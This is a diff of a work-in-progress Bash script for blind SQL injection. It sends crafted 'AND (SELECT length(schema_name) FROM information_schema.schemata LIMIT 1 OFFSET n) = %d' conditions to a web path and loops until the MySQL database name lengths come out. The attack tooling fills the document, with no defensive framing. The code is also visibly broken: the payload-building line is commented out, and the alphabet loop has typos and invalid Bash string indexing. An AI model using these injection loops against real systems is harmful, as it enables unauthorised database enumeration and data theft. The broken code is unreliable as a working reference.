@@ -3,39 +3,60 @@
 declare -A object
 MYSQL_STANDARD_DATABASES=('mysql','information_schema')
 
+function enumarteViaNumber() {
+	((index++))
+  	[ $index -le 100 ]
+}
+
+function enumarteViaalphabet() {
+	aplphabet='abcdefghijklmnopqrstuvwxyz'
+        ((y++))
+	echo $aplphabet[0]
+	index=$(echo $aplphabet[$y])
+	echo "$index"
+	echo $y
+        [ $y -le 26 ]
+}
+
 function loopThrow() {
 	START=1
 	END=100
 	placeholderSqli="$1"
-	for (( index=$START; index<=$END; index++  )); do
-		sqli="$(printf "${placeholderSqli}" "$index")"
+	#loop_condition=(( index=$START; index<=$END; index++ ))
+
+	while "${object['condition']}"; do
+		#sqli="$(printf "${placeholderSqli}" "$index")"
 		request "$sqli"
                 result=$(echo $?)
                 if [ $result -eq 0 ]; then
-                        object['lengthOfDatabaseNames']+="$index "
+                        echo "$index "
                         break
                 fi
 	done
+	index=0
+	y=0
 }
 
 
 function getLength() {
-	echo 'i get you the length'
 	# store the length in array!
 	# required: ??
 	# parameter: ??
 	# IT Create from three parameter the sqli!
 
 	START_Y=1
-        END_Y="${object['amountOfDatabases']}"
+	END_Y=$((object['amountOfDatabases']))
+	results=''
 	sqlQuery="$1"
+	#object['condition']='enumarteViaNumber'
+	object['condition']='enumarteViaalphabet'
 
 	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
 		count=$((indey-1))
 		sqli="AND (${sqlQuery} LIMIT 1 OFFSET $count) = %d"
-		loopThrow "$sqli"
+		results+=$(loopThrow "$sqli")
 	done
-	echo "${object['lengthOfDatabaseNames']}"
+	echo $results
 }
 
 function encodeToUrl() {
@@ -115,4 +136,6 @@ PATH="products/1"
 #echo "There are ${amountOfDatabases} in the server"
 # es sind 5 databases drinne!
 object['amountOfDatabases']='5'
-getLength 'SELECT length(schema_name) FROM information_schema.schemata
+#object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata')
+getLength 'SELECT length(schema_name) FROM information_schema.schemata'
+echo "${object['lengthOfDatabaseNames']}"
